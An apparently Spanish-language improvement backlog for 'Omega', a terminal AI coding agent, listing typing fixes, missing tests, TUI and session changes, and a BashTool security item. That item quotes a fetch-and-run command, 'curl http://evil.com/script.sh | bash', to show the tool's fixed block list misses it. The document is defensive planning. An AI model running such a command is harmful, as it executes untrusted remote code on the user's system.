# Mejoras propuestas para Omega

## 🔴 Alta prioridad

### 1. Tipar `any` en runner y providers ✅

El runner castea la respuesta del LLM como `any`:

- `runner.ts:55` → `const data: any`
- `openrouter-llm-provider.ts:141` → `parseResponse(data: any)`
- `anthropic-llm-provider.ts` → `call()` devuelve `Promise<unknown>` y runner lo trata como `any`
- `catch (err: any)` en tools, session, providers (varios archivos)

**Solución**: Unificar el tipo de respuesta que el runner espera (ya existe `ProviderResponse` en openrouter, pero AnthropicProvider devuelve `unknown`). Definir un tipo común `LLMResponse` en `llm-provider.ts` que ambos providers implementen.

---

### 2. Tests del Runner ✅

No hay tests para el loop agéntico principal. Es el componente más crítico del sistema:

- `runner.ts` — 0 tests
- Traducción de mensajes en OpenRouterProvider
- `parseResponse`
- Mecanismo de retry/backoff
- Manejo de `max_tokens` y `end_turn`
- Casos borde: tool que no existe, error en tool, respuesta vacía

**Solución**: Agregar tests con un provider mock que devuelva respuestas controladas.

---

### 3. Tests de OpenRouterProvider ✅

El provider real tampoco tiene tests:

- `translateMessages()` — conversión del formato interno al de OpenAI
- `translateTools()` — conversión de herramientas
- `parseResponse()` — parseo de la respuesta cruda
- Retry lógico (429, 529), timeout

---

## 🟡 Media prioridad

### 4. Selección de provider por config

`AnthropicProvider` existe pero no se usa. Debería seleccionarse vía variable de entorno `PROVIDER=anthropic|openrouter`.

---

### 5. Historial de comandos en el editor de línea

`LineEditor` no permite navegar comandos anteriores con up/down. Tampoco tiene:

- Cursor visible (no podés moverte con left/right)
- Ctrl+u (borrar línea), Ctrl+w (borrar palabra), Ctrl+k (borrar hasta el final)
- El método `commands()` está vacío (dead code)

---

### 6. Comando `/help` ✅

Solo existe `/clear`. No hay forma de que el usuario descubra los comandos disponibles. Agregar `/help` que liste los comandos y describa brevemente el uso.

---

### 7. `DisplayToolCall` sin usar ✅

La clase existe y está exportada pero nunca se instancia en `index.ts`. Cuando el runner usa una tool, imprime "Usando tool: ..." como texto genérico.

---

### 8. Límite de contexto / windowing en Session

`Session` acumula mensajes sin límite. En conversaciones largas, el historial crece hasta exceder el contexto del modelo. Implementar ventana deslizante (`sliding window`) o truncar mensajes viejos.

---

### 9. El spinner y el output no conviven bien

El spinner se arranca/para en cada iteración, pero si el LLM tarda o hay output intercalado, los mensajes se pisen si el terminal se redimensiona. Mejorar el manejo de cursor en la TUI.

---

## 🟢 Baja prioridad

### 10. Restaurar raw mode en salidas abruptas

En `render.ts:23`, Ctrl+C hace `process.exit(0)`. Si el proceso muere por `SIGTERM` o `SIGKILL`, la terminal queda en raw mode y el usuario tiene que ejecutar `reset` manualmente.

---

### 11. Error de tool `read` cuando input es inválido ✅

```ts
return `Error reading ${input}: ${err.message}`;
```
Si `input` no es válido, muestra `[object Object]`. Debería mostrar un mensaje más limpio.

---

### 12. Streaming

La llamada al LLM es request/response completa. Con modelos grandes el usuario espera sin feedback. Streaming (SSE) mejoraría la experiencia. Requiere refactor del provider y del runner.

---

### 13. Seguridad de BashTool

Los patrones bloqueados son una lista fija. Un comando como `curl http://evil.com/script.sh | bash` no es detectado. El mismo código lo admite: "Esto NO es un sandbox". Agregar un modo restringido con lista blanca de comandos.

---

### 14. Tests de componentes TUI

No hay tests para:

- `decodeKey.ts`
- `render.ts`
- `spinner.ts`
- `line-editor.ts`
- `display-text.ts`

---

### 15. Tests de commands

No hay tests para `/clear` ni para el `dispatchCommand`.

---

### 16. Tests de context-management

`truncate()` no tiene tests.

---

### 17. Tests de Session

Existen tests básicos, pero no cubren:

- Persistencia (carga/guardado en disco)
- Reanudación por id
- Clear
- info()